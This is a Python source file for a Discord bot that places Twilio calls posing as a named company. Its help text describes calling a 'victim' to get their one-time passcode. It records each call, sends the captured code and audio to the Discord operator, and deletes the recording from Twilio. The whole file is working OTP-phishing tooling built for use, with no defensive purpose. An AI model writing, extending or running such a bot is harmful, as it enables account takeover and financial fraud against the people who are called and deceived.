import asyncio

import discord_slash.utils.manage_commands
import discord
from discord.ext import commands
from discord_slash import SlashCommand, SlashContext
from flask import Flask, request
from twilio.rest import Client
import time
import os
import json
import threading
import requests

if not 'Config.txt' in os.listdir():
    open('Config.txt', 'w').write('{"account_sid":"", "auth_token":"", "Twilio Phone Number":"+123456789", "ngrok_url":"https://example.ngrok.io", "bot_token":""}')
if not 'Extra' in os.listdir():
    os.mkdir('Extra')
if not 'user_db_otp' in os.listdir('Extra'):
    os.mkdir('Extra/user_db_otp')
if not 'user_queue' in os.listdir('Extra'):
    open(f'Extra/user_queue', 'w').close()


raw_config = json.loads(open('Config.txt', 'r').read())

client_discord = commands.Bot(command_prefix='?', help_command=None, pass_context=True, case_insensitive=True)
slash = SlashCommand(client_discord, sync_commands=True)
guild = discord.Guild
account_sid = raw_config['account_sid']
auth_token = raw_config['auth_token']
your_twilio_phone_number = raw_config['Twilio Phone Number']
ngrok = raw_config['ngrok_url']
client = Client(account_sid, auth_token)

app = Flask(__name__)
loop = asyncio.get_event_loop()

@client_discord.event
async def on_ready():
    print('Bot Alive!')

async def abc(sid, id):
    a = 0
    b = 0
    c = 0
    d = 0
    print(sid)
    while True:
        if client.calls(sid).fetch().status == 'queued':
            if not a >= 1:
                open(f'Extra/user_db_otp/{id}/status1.txt', 'w').write('Queued')
                a = a + 1
        elif client.calls(sid).fetch().status == 'ringing':
            if not b >= 1:
                open(f'Extra/user_db_otp/{id}/status1.txt', 'w').write('Ringing')
                b = b + 1
        elif client.calls(sid).fetch().status == 'in-progress':
            if not c >= 1:
                open(f'Extra/user_db_otp/{id}/status1.txt', 'w').write('In Progress')
                c = c + 1
        elif client.calls(sid).fetch().status == 'completed':
            open(f'Extra/user_db_otp/{id}/status1.txt', 'w').write('Completed')
            break
        elif client.calls(sid).fetch().status == 'failed':
            open(f'Extra/user_db_otp/{id}/status1.txt', 'w').write('Failed')
            break
        elif client.calls(sid).fetch().status == 'no-answer':
            open(f'Extra/user_db_otp/{id}/status1.txt', 'w').write('No Answer')
            break
        elif client.calls(sid).fetch().status == 'canceled':
            open(f'Extra/user_db_otp/{id}/status1.txt', 'w').write('Canceled')
            break
        elif client.calls(sid).fetch().status == 'busy':
            open(f'Extra/user_db_otp/{id}/status1.txt', 'w').write('Busy')
            break
        await asyncio.sleep(1)


@client_discord.command()
async def call(ctx, *content):
    content = list(content)
    if content == []:
        await ctx.send('.call PhoneNumber AmountOfOtpDigits Name CompanyName')
    else:
        if len(content) != 4:
            await ctx.send('.call PhoneNumber AmountOfOtpDigits Name CompanyName')
        else:
            phone = content[0]
            digits = content[1]
            name = content[2]
            companyname = content[3]
            embed = discord.Embed(title='', description=f'OTP : \n\nStatus : Pending\nExtra Status : ',
                                  color=discord.Colour.blue())
            nothing = await ctx.send(embed=embed)
            if not str(ctx.author.id) in os.listdir('Extra/user_db_otp'):
                os.mkdir(f'Extra/user_db_otp/{ctx.author.id}')
            raw_queue = open('Extra/user_queue').readlines()
            for e in raw_queue:
                if phone in e.split(' - ')[1]:
                    embed = discord.Embed(title='', description=f'OTP : \n\nStatus : Please Wait For Your Call To Completed\nExtra Status : ',
                                      color=discord.Colour.red())
                    await nothing.edit(embed=embed)
                    return
                elif str(ctx.author.id) == e.split(' - ')[0]:
                    embed = discord.Embed(title='',
                                          description=f'OTP : \n\nStatus : Please Wait For Your Call To Completed\nExtra Status : ',
                                          color=discord.Colour.red())
                    await nothing.edit(embed=embed)
                    return
            open(f'Extra/user_db_otp/{ctx.author.id}/Digits.txt', 'w').write(f'{digits}')
            open(f'Extra/user_db_otp/{ctx.author.id}/Name.txt', 'w').write(f'{name}')
            open(f'Extra/user_db_otp/{ctx.author.id}/Company Name.txt', 'w').write(f'{companyname}')
            open(f'Extra/user_db_otp/{ctx.author.id}/otp.txt', 'w').close()
            open(f'Extra/user_db_otp/{ctx.author.id}/status.txt', 'w').close()
            open(f'Extra/user_db_otp/{ctx.author.id}/status1.txt', 'w').close()
            open(f'Extra/user_db_otp/{ctx.author.id}/recording.txt', 'w').close()
            call = client.calls.create(
                url=f'{ngrok}/voice',
                to=f'{phone}',
                from_=f'{your_twilio_phone_number}',
                record=True,
                recording_status_callback=f'{ngrok}/status_fallback'
            )
            sid = call.sid
            open('Extra/user_queue', 'a').write(f'{ctx.author.id} - {phone} - {sid}\n')
            task = asyncio.create_task(abc(sid=sid, id=str(ctx.author.id)))
            me = ''
            me2 = ''
            otp = ''
            color = discord.Colour.green()
            while True:
                me_ = open(f'Extra/user_db_otp/{ctx.author.id}/status1.txt', 'r').read()
                if me_ != me:
                    me = me_
                    if me_ in ['Failed', 'No Answer', 'Canceled', 'Busy']:
                        embed = discord.Embed(title='',
                                              description=f'OTP : {otp}\n\nStatus : {me_}\nExtra Status : {me2}',
                                              color=discord.Colour.red())
                        await nothing.edit(embed=embed)
                    elif me_ in ['Completed']:
                        if otp == '':
                            embed = discord.Embed(title='',
                                                  description=f'OTP : Failed\n\nStatus : {me_}\nExtra Status : {me2}',
                                                  color=discord.Colour.red())
                        else:
                            embed = discord.Embed(title='',
                                                  description=f'OTP : {otp}\n\nStatus : {me_}\nExtra Status : {me2}',
                                                  color=discord.Colour.green())
                        await nothing.edit(embed=embed)
                    else:
                        embed = discord.Embed(title='',
                                              description=f'OTP : {otp}\n\nStatus : {me_}\nExtra Status : {me2}',
                                              color=discord.Colour.green())
                        color = discord.Colour.green()
                    await nothing.edit(embed=embed)
                me_2 = open(f'Extra/user_db_otp/{ctx.author.id}/status.txt', 'r').read()
                if me_2 != me2:
                    me2 = me_2
                    embed = discord.Embed(title='', description=f'OTP : {otp}\n\nStatus : {me_}\nExtra Status : {me_2}',
                                          color=color)
                    await nothing.edit(embed=embed)
                otp = open(f'Extra/user_db_otp/{ctx.author.id}/otp.txt', 'r').read()
                if otp != '':
                    embed = discord.Embed(title='', description=f'OTP : {otp}\n\nStatus : {me_}\nExtra Status : {me2}',
                                          color=discord.Colour.green())
                    await nothing.edit(embed=embed)
                me_3 = open(f'Extra/user_db_otp/{ctx.author.id}/recording.txt', 'r').read()
                if me_3 != '':
                    embed = discord.Embed(title='', description=f'Downloading Record.mp3',
                                          color=discord.Colour.green())
                    message = await ctx.send(embed=embed)

                    doc = requests.get(me_3.split(' - ')[0])
                    with open(f'Extra/user_db_otp/{ctx.author.id}/recording.mp3', 'wb') as f:
                        f.write(doc.content)

                    embed = discord.Embed(title='', description=f'Sending Record.mp3',
                                          color=discord.Colour.green())
                    await message.edit(embed=embed)
                    await ctx.send(file=discord.File(f'Extra/user_db_otp/{ctx.author.id}/recording.mp3'))
                    await message.delete()
                    client.recordings(me_3.split(' - ')[1]).delete()
                    open(f'Extra/user_db_otp/{ctx.author.id}/status.txt', 'w').close()
                    open(f'Extra/user_db_otp/{ctx.author.id}/status1.txt', 'w').close()
                    open(f'Extra/user_db_otp/{ctx.author.id}/recording.txt', 'w').close()
                    open(f'Extra/user_db_otp/{ctx.author.id}/otp.txt', 'w').close()
                    open(f'Extra/user_db_otp/{ctx.author.id}/Name.txt', 'w').close()
                    open(f'Extra/user_db_otp/{ctx.author.id}/Digits.txt', 'w').close()
                    open(f'Extra/user_db_otp/{ctx.author.id}/Company Name.txt', 'w').close()
                    break
                asyncio.sleep(1.5)
            asyncio.sleep(1)
            open(f'Extra/user_db_otp/{ctx.author.id}/otp.txt', 'w').close()
            open(f'Extra/user_db_otp/{ctx.author.id}/status.txt', 'w').close()
            open(f'Extra/user_db_otp/{ctx.author.id}/status1.txt', 'w').close()

@client_discord.command()
async def callagain(ctx, *content):
    content = list(content)
    if content == []:
        await ctx.send('.call PhoneNumber AmountOfOtpDigits Name CompanyName')
    else:
        if len(content) != 4:
            await ctx.send('.call PhoneNumber AmountOfOtpDigits Name CompanyName')
        else:
            phone = content[0]
            digits = content[1]
            name = content[2]
            companyname = content[3]
            embed = discord.Embed(title='', description=f'OTP : \n\nStatus : Pending\nExtra Status : ',
                                  color=discord.Colour.blue())
            nothing = await ctx.send(embed=embed)
            if not str(ctx.author.id) in os.listdir('Extra/user_db_otp'):
                os.mkdir(f'Extra/user_db_otp/{ctx.author.id}')
            raw_queue = open('Extra/user_queue').readlines()
            for e in raw_queue:
                if phone in e.split(' - ')[1]:
                    embed = discord.Embed(title='',
                                          description=f'OTP : \n\nStatus : Please Wait For Your Call To Completed\nExtra Status : ',
                                          color=discord.Colour.red())
                    await nothing.edit(embed=embed)
                    return
                elif str(ctx.author.id) == e.split(' - ')[0]:
                    embed = discord.Embed(title='',
                                          description=f'OTP : \n\nStatus : Please Wait For Your Call To Completed\nExtra Status : ',
                                          color=discord.Colour.red())
                    await nothing.edit(embed=embed)
                    return
            open(f'Extra/user_db_otp/{ctx.author.id}/Digits.txt', 'w').write(f'{digits}')
            open(f'Extra/user_db_otp/{ctx.author.id}/Name.txt', 'w').write(f'{name}')
            open(f'Extra/user_db_otp/{ctx.author.id}/Company Name.txt', 'w').write(f'{companyname}')
            open(f'Extra/user_db_otp/{ctx.author.id}/otp.txt', 'w').close()
            open(f'Extra/user_db_otp/{ctx.author.id}/status.txt', 'w').close()
            open(f'Extra/user_db_otp/{ctx.author.id}/status1.txt', 'w').close()
            open(f'Extra/user_db_otp/{ctx.author.id}/recording.txt', 'w').close()
            call = client.calls.create(
                url=f'{ngrok}/voiceagain',
                to=f'{phone}',
                from_=f'{your_twilio_phone_number}',
                record=True,
                recording_status_callback=f'{ngrok}/status_fallback'
            )
            sid = call.sid
            open('Extra/user_queue', 'a').write(f'{ctx.author.id} - {phone} - {sid}\n')
            x = threading.Thread(target=abc, args=(sid, str(ctx.author.id),))
            x.start()
            me = ''
            me2 = ''
            otp = ''
            color = discord.Colour.green()
            while True:
                me_ = open(f'Extra/user_db_otp/{ctx.author.id}/status1.txt', 'r').read()
                if me_ != me:
                    me = me_
                    if me_ in ['Failed', 'No Answer', 'Canceled', 'Busy']:
                        embed = discord.Embed(title='',
                                              description=f'OTP : {otp}\n\nStatus : {me_}\nExtra Status : {me2}',
                                              color=discord.Colour.red())
                        await nothing.edit(embed=embed)
                    elif me_ in ['Completed']:
                        if otp == '':
                            embed = discord.Embed(title='',
                                                  description=f'OTP : Failed\n\nStatus : {me_}\nExtra Status : {me2}',
                                                  color=discord.Colour.red())
                        else:
                            embed = discord.Embed(title='',
                                                  description=f'OTP : {otp}\n\nStatus : {me_}\nExtra Status : {me2}',
                                                  color=discord.Colour.green())
                        await nothing.edit(embed=embed)
                    else:
                        embed = discord.Embed(title='',
                                              description=f'OTP : {otp}\n\nStatus : {me_}\nExtra Status : {me2}',
                                              color=discord.Colour.green())
                        color = discord.Colour.green()
                    await nothing.edit(embed=embed)
                me_2 = open(f'Extra/user_db_otp/{ctx.author.id}/status.txt', 'r').read()
                if me_2 != me2:
                    me2 = me_2
                    embed = discord.Embed(title='', description=f'OTP : {otp}\n\nStatus : {me_}\nExtra Status : {me_2}',
                                          color=color)
                    await nothing.edit(embed=embed)
                otp = open(f'Extra/user_db_otp/{ctx.author.id}/otp.txt', 'r').read()
                if otp != '':
                    embed = discord.Embed(title='', description=f'OTP : {otp}\n\nStatus : {me_}\nExtra Status : {me2}',
                                          color=discord.Colour.green())
                    await nothing.edit(embed=embed)
                me_3 = open(f'Extra/user_db_otp/{ctx.author.id}/recording.txt', 'r').read()
                if me_3 != '':
                    embed = discord.Embed(title='', description=f'Downloading Record.mp3',
                                          color=discord.Colour.green())
                    message = await ctx.send(embed=embed)

                    doc = requests.get(me_3.split(' - ')[0])
                    with open(f'Extra/user_db_otp/{ctx.author.id}/recording.mp3', 'wb') as f:
                        f.write(doc.content)

                    embed = discord.Embed(title='', description=f'Sending Record.mp3',
                                          color=discord.Colour.green())
                    await message.edit(embed=embed)
                    await ctx.send(file=discord.File(f'Extra/user_db_otp/{ctx.author.id}/recording.mp3'))
                    await message.delete()
                    client.recordings(me_3.split(' - ')[1]).delete()
                    open(f'Extra/user_db_otp/{ctx.author.id}/status.txt', 'w').close()
                    open(f'Extra/user_db_otp/{ctx.author.id}/status1.txt', 'w').close()
                    open(f'Extra/user_db_otp/{ctx.author.id}/recording.txt', 'w').close()
                    open(f'Extra/user_db_otp/{ctx.author.id}/otp.txt', 'w').close()
                    open(f'Extra/user_db_otp/{ctx.author.id}/Name.txt', 'w').close()
                    open(f'Extra/user_db_otp/{ctx.author.id}/Digits.txt', 'w').close()
                    open(f'Extra/user_db_otp/{ctx.author.id}/Company Name.txt', 'w').close()
                    break
                asyncio.sleep(1.5)
            asyncio.sleep(1)
            open(f'Extra/user_db_otp/{ctx.author.id}/otp.txt', 'w').close()
            open(f'Extra/user_db_otp/{ctx.author.id}/status.txt', 'w').close()
            open(f'Extra/user_db_otp/{ctx.author.id}/status1.txt', 'w').close()

@client_discord.command()
async def help(ctx):
    embed = discord.Embed(title='', description=f'', color=discord.Colour.green())
    embed.add_field(name='Commands', value='.call <+1234567890 PhoneNumber> <The length of the otp code> <Name> <Company Name>\n\n.callagain <+1234567890 PhoneNumber> <The length of the otp code> <Name> <Company Name>', inline=True)
    embed.add_field(name='Commands',
                    value='Call Victim For Otp Code\n\n\nVictim Gave Wrong OTP Code?',
                    inline=True)

    await ctx.send(embed=embed)

client_discord.run(
    raw_config['bot_token']
)
